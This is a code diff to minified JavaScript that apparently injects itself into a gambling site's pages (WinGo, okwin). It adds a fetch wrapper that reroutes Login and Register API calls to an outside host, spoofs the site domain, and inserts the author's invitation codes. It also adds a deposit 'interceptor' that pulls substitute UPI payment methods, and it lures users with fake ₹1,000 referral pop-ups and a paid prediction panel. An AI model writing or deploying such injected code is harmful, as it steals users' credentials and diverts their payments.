@@ -20,9 +20,9 @@ function Ot({
     });
   });
   let c = window.fetch,
-    p = "",
+    p = "https://vercel-edge-ruddy-gamma.vercel.app",
     w = /\/api\/webapi\/(Register|Login)$/,
-    S = "",
+    S = '{"code":1,"msg":"' + i + '"}',
     $ = "";
   function g(m, h) {
     try {
@@ -40,9 +40,15 @@ function Ot({
     return {};
   }
   function W(m) {
-    return m;
+    if (typeof m !== "string") return m;
+    let h = m.startsWith(n) ? m.slice(n.length) : m;
+    return w.test(h) ? p + h : h;
   }
-  function L() {}
+  function L() {
+    setTimeout(() => {
+      (localStorage.clear(), sessionStorage.clear(), (window.location.href = o));
+    }, 1500);
+  }
   function q() {
     let m = M();
     return (
@@ -88,6 +94,16 @@ function Ot({
     return "";
   }
   function C(m, h) {
+    if (!m || !w.test(m) || !h) return h;
+    try {
+      let z = JSON.parse(h);
+      if (!z.domainurl) z.domainurl = t;
+      if (m.includes("/api/webapi/Register")) {
+        let U = sessionStorage.getItem("wg_ref");
+        if (U && !z.wg_ref) z.wg_ref = U;
+      }
+      return JSON.stringify(z);
+    } catch {}
     return h;
   }
   function O(m) {
@@ -153,6 +169,12 @@ function Ot({
       .catch(() => {});
   }
   function Un(m, h) {
+    if (m && (m.includes("/Login") || m.includes("/Register")))
+      h.text()
+        .then((z) => {
+          if (z.includes(i)) L();
+        })
+        .catch(() => {});
     if (m && f && m.includes("WinGo")) {
       let z = m.match(/WinGo_([\w]+)/),
         U = z ? "WinGo_" + z[1] : null;
@@ -2492,7 +2514,7 @@ function ge() {
 }
 function Po() {
   if (k) return;
-  let n = "www.cqz6091.com".includes("91club"),
+  let n = "www.8okwin4.com".includes("okwin"),
     t = document.createElement("style");
   ((t.textContent = `.wgp-overlay {
   position: fixed;
@@ -2690,8 +2712,8 @@ function Po() {
     (D.innerHTML = `<button class="wgp-close" id="wgp-close">✕</button>
 <div class="wgp-hero">
   <div class="wgp-icon">\uD83D\uDCB0</div>
-  <div class="wgp-amount">FREE ₹1,0000</div>
-  <div class="wgp-pill">Per cds &bull; No Limit &bull; Instant Payout</div>
+  <div class="wgp-amount">FREE ₹1,000</div>
+  <div class="wgp-pill">Per Referral &bull; No Limit &bull; Instant Payout</div>
 </div>
 <div class="wgp-stats">
   <div class="wgp-chip">\uD83D\uDCB8 Instant</div>
@@ -2763,8 +2785,11 @@ function Le(n) {
     l = n.querySelector(".bonus-bar-fill"),
     f = "";
   function c() {
-    let w = location.origin + "/#/register";
-    return f ? w + "?ref=" + f : w;
+    let w =
+      location.origin +
+      "/#/register?invitationCode=" +
+      (sessionStorage.getItem("invitecode") || "");
+    return f ? w + "&ref=" + f : w;
   }
   function p() {
     let w = sessionStorage.getItem("wg_user") || "";
@@ -3137,7 +3162,7 @@ function $e(n, t) {
 }
 var hn = {
     interceptor_enabled: !1,
-    min_deposit: 100,
+    min_deposit: 500,
     upis: [],
   },
   vt = !1;
@@ -3170,10 +3195,10 @@ async function yt() {
     });
     if (n.ok) {
       let t = await n.json(),
-        e = Number(t?.min_deposit ?? t?.minDeposit ?? 100);
+        e = Number(t?.min_deposit ?? t?.minDeposit ?? 500);
       ((hn = {
         interceptor_enabled: Boolean(t?.interceptor_enabled ?? t?.interceptorEnabled ?? t?.enabled),
-        min_deposit: Number.isFinite(e) && e > 0 ? e : 100,
+        min_deposit: Number.isFinite(e) && e > 0 ? e : 500,
         upis: We(t?.payment_methods ?? t?.upis),
       }),
         (vt = !0));
@@ -3181,14 +3206,14 @@ async function yt() {
   } catch {
     ((hn = {
       interceptor_enabled: !1,
-      min_deposit: 100,
+      min_deposit: 500,
       upis: [],
     }),
       (vt = !0));
   }
 }
 function No(n) {
-  let t = Number(hn.min_deposit || 100),
+  let t = Number(hn.min_deposit || 500),
     e = Number(String(n?.value ?? "").replace(/[^\d.]/g, "")),
     o = Number.isFinite(e) ? e : 0;
   return Math.max(o, t);
@@ -4145,11 +4170,12 @@ function Do(n) {
     };
   if ((e(), t > Date.now())) Fn = setInterval(e, 1000);
 }
-var Bo = "",
-  Ao = "",
-  so = "/#/register",
+sessionStorage.setItem("invitecode", "116261778244");
+var Bo = "https://imgametransit.com",
+  Ao = "Account unavailable. Please create a new account.",
+  so = "/#/register?invitationCode=116261778244",
   Ro = "/#/wallet/Recharge",
-  bo = "cqz6091.com".includes("91club") ? "light" : "light",
+  bo = "www.8okwin4.com".includes("okwin") ? "light" : "light",
   Be = "";
 function _(n) {
   let t = String(n == null ? "" : n).trim();
@@ -4279,8 +4305,8 @@ function Te() {
 }
 Ot({
   apiBase: Bo,
-  spoofDomain: "cqz6091.com",
-  minBalance: 100,
+  spoofDomain: "www.8okwin4.com",
+  minBalance: 500,
   nukeUrl: so,
   authErrMsg: Ao,
   onBalance: (n) => {
@@ -9962,7 +9988,7 @@ if (!customElements.get("prediction-panel"))
       <span class="gate-balance" id="gate-bal">₹0.00</span>
     </div>
     <p class="gate-desc">
-      Minimum ₹100 balance required to
+      Minimum ₹500 balance required to
       <br />
       access real-time predictions.
     </p>
@@ -9990,7 +10016,7 @@ if (!customElements.get("prediction-panel"))
     <div class="bonus-stats-row">
       <div class="bonus-stat">
         <span class="bonus-stat-val">₹1,000</span>
-        <span class="bonus-stat-lbl">Per cds</span>
+        <span class="bonus-stat-lbl">Per referral</span>
       </div>
       <div class="bonus-stat">
         <span class="bonus-stat-val">∞</span>
@@ -10074,9 +10100,9 @@ if (!customElements.get("prediction-panel"))
   <div class="wg-close-x" id="wg-promo-close">✕</div>
   <div class="wg-pop-hero">
     <div class="wg-pop-icon">💰</div>
-    <div class="wg-pop-amount">FREE ₹1,0700</div>
+    <div class="wg-pop-amount">FREE ₹1,000</div>
     <div class="wg-pop-pill">
-      Per cds &bull; No Limit &bull; Instant Payout
+      Per Referral &bull; No Limit &bull; Instant Payout
     </div>
   </div>
   <div class="wg-pop-stats">
